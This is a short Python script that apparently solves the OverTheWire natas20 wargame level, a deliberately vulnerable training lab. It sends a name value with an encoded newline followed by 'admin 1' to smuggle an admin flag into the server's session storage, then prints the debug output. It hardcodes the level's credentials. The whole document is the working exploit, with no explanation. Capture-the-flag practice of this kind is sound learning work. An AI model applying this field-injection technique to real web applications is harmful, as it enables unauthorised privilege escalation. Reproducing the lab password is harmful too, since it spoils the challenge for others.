import requests

base_url = "http://natas20.natas.labs.overthewire.org/index.php?debug"
r = requests.session()
r.get(base_url+"&name=%0Aadmin 1",
      auth=("natas20", "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"))
print(r.get(base_url, auth=("natas20", "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH")
            ).text.split("<pre>")[1].split("</pre>")[0])
